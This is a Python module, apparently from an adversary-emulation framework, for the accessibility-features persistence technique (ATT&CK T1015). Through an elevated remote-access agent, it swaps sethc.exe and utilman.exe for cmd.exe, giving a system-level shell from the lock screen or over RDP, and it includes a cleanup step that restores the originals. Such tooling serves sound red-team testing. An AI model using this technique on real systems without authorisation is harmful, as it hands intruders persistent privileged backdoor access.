from plugins.adversary.app.commands import static
from plugins.adversary.app.operation.operation import Step, OPRat, OPPersistence, OPVar, OPFile
import random


class AssociationAbuse(Step):
    """
    Description:
        This step replaces the default executables of sethc.exe (sticky keys), and utilman.exe (windows + u), with
        cmd.exe. This allows for ready access to a system-level shell, even over RDP or when locked out.
    Requirements:
        Requires an elevated Rat.
    """
    attack_mapping = [('T1015', 'Persistence'), ('T1015', 'Privilege Escalation')]
    display_name = "accessibility_features"
    summary = "Replaces the common utility programs of sethc.exe and utilman.exe with CMD.exe"

    preconditions = [("rat", OPRat({"elevated": True}))]
    postconditions = [("file_g", OPFile),
                      ("persistence_g", OPPersistence({"host": OPVar("rat.host"), "elevated": True}))]

    preproperties = ["rat.host.fqdn"]

    significant_parameters = []

    @staticmethod
    def description():
        return "Replacing default sethc.exe and utilman.exe executables with CMD for persistent access"

    @staticmethod
    async def simulate(operation, rat, persistence_g, file_g):
        return True

    @staticmethod
    async def action(operation, rat, persistence_g, file_g):
        random.seed()
        key_id = random.randint(1,1000)
        await operation.execute_shell_command(rat, *static.accessFeatA(key_id))
        await operation.execute_shell_command(rat, *static.accessFeatB(key_id))
        f1 = await file_g({'host': rat.host, 'path': str(key_id), 'use_case':
            'modified', 'src_path': 'C:\\Windows\\System32\\sethc.exe'})
        f2 = await file_g({'host': rat.host, 'path': str(key_id), 'use_case':
            'modified', 'src_path': 'C:\\Windows\\System32\\utilman.exe'})
        await persistence_g({'file_artifact': f1, 'host': rat.host.fqdn})
        await persistence_g({'file_artifact': f2, 'host': rat.host.fqdn})
        return True

    @staticmethod
    async def cleanup(cleaner, file_g, persistence_g):
        for entry in file_g:
            pass
        for persist in persistence_g:
            await cleaner.static_revert(persist, "move /Y " + persist['file_artifact']['src_path'] + '.' +
                                        persist['file_artifact']['path'] + " " +
                                        persist['file_artifact']['src_path'])

